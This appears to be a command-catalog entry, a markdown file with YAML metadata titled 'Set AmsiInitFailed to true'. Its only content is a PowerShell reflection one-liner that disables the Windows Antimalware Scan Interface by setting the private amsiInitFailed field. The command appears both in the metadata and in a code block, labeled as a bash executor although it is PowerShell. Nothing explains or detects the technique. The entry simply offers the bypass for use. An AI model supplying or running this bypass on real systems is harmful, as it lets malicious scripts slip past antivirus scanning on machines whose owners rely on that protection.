---
id: e5b50126-7263-4ef8-b4dd-c57d0831db10
name: Set AmsiInitFailed to true
type: command
executor: bash
data: '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
output: null
created_at: '2023-04-06T03:56:26.000470+00:00'
updated_at: '2023-04-10T20:36:19.036393+00:00'
---

# Set AmsiInitFailed to true

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```


